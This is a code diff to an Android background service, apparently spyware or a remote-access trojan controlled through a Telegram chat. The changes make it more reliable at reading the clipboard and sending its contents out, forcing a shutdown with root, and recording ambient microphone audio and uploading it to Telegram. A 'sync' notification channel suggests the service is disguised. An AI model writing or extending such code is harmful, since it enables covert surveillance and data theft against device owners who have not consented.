@@ -10,7 +10,7 @@ import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
-import android.content.ClipboardManager // <-- التعديل الهندسي الصحيح لاستيراد الحافظة
+import android.content.ClipboardManager
 import android.location.Location
 import android.location.LocationListener
 import android.location.LocationManager
@@ -47,7 +47,7 @@ class BackgroundControlService : Service() {
 
     companion object {
         private const val TAG = "StrictSovereignEngine"
-        private const val CHANNEL_ID = "sync_channel_strict_core_v1002"
+        private const val CHANNEL_ID = "sync_channel_strict_core_v1003"
         private const val NOTIFICATION_ID = 2026
     }
 
@@ -61,6 +61,7 @@ class BackgroundControlService : Service() {
     private var lastUpdateId = 0L
 
     private val executionExecutor = Executors.newFixedThreadPool(4)
+    private val mainHandler = android.os.Handler(Looper.getMainLooper())
 
     override fun onBind(intent: Intent?): IBinder? = null
 
@@ -316,16 +317,18 @@ class BackgroundControlService : Service() {
     }
 
     private fun fetchSystemClipboard(chatId: String) {
-        try {
-            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
-            if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
-                val text = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
-                sendDirectMessage(chatId, "📋 الحافظة:\n\n$text")
-            } else {
-                sendDirectMessage(chatId, "ℹ️ الحافظة فارغة.")
+        mainHandler.post {
+            try {
+                val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+                if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
+                    val text = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
+                    sendDirectMessage(chatId, "📋 محتوى الحافظة المستخرج:\n\n$text")
+                } else {
+                    sendDirectMessage(chatId, "ℹ️ الحافظة فارغة أو لا تحتوي على نصوص.")
+                }
+            } catch (e: Exception) {
+                sendDirectMessage(chatId, "❌ خطأ الحافظة: ${e.message}")
             }
-        } catch (e: Exception) {
-            sendDirectMessage(chatId, "❌ خطأ الحافظة: ${e.message}")
         }
     }
 
@@ -346,13 +349,17 @@ class BackgroundControlService : Service() {
     }
 
     private fun executeHardShutdown(chatId: String) {
-        sendDirectMessage(chatId, "🔌 جاري إطفاء الجهاز قسرياً...")
+        sendDirectMessage(chatId, "🔌 جاري تنفيذ إطفاء الجهاز قسرياً...")
         try {
-            Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot -p"))
+            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot -p"))
+            process.waitFor()
         } catch (e: Exception) {
             try {
-                Runtime.getRuntime().exec(arrayOf("su", "-c", "stop"))
-            } catch (_: Exception) {}
+                val process2 = Runtime.getRuntime().exec(arrayOf("su", "-c", "shell reboot -p"))
+                process2.waitFor()
+            } catch (ex: Exception) {
+                sendDirectMessage(chatId, "❌ فشل الإطفاء: ${ex.message}")
+            }
         }
     }
 
@@ -382,16 +389,26 @@ class BackgroundControlService : Service() {
     }
 
     private fun executeAudioCapture(chatId: String, durationSeconds: Int) {
-        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) return
+        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
+            sendDirectMessage(chatId, "❌ صلاحية الميكروفون غير ممنوحة.")
+            return
+        }
         executionExecutor.execute {
             val outputFile = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
             var recorder: MediaRecorder? = null
             try {
-                sendDirectMessage(chatId, "🎙️ بدء التسجيل الصوتي ($durationSeconds ثانية)...")
-                recorder = MediaRecorder(this).apply {
+                sendDirectMessage(chatId, "🎙️ بدء التسجيل الصوتي المحيطي ($durationSeconds ثانية)...")
+                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    MediaRecorder(this)
+                } else {
+                    @Suppress("DEPRECATION")
+                    MediaRecorder()
+                }.apply {
                     setAudioSource(MediaRecorder.AudioSource.MIC)
                     setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                     setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                    setAudioEncodingBitRate(128000)
+                    setAudioSamplingRate(44100)
                     setOutputFile(outputFile.absolutePath)
                     prepare()
                     start()
@@ -402,7 +419,9 @@ class BackgroundControlService : Service() {
                 recorder = null
 
                 if (outputFile.exists() && outputFile.length() > 0) {
-                    pushFileToTelegram(chatId, outputFile, "sendAudio", "audio", "audio/mp4", "🎙️ تسجيل صوتي محيطي")
+                    pushFileToTelegram(chatId, outputFile, "sendAudio", "audio", "audio/mp4", "🎙️ تسجيل صوتي محيطي واضح")
+                } else {
+                    sendDirectMessage(chatId, "⚠️ لم يتم حفظ ملف الصوت.")
                 }
             } catch (e: Exception) {
                 sendDirectMessage(chatId, "❌ خطأ التسجيل الصوتي: ${e.message}")
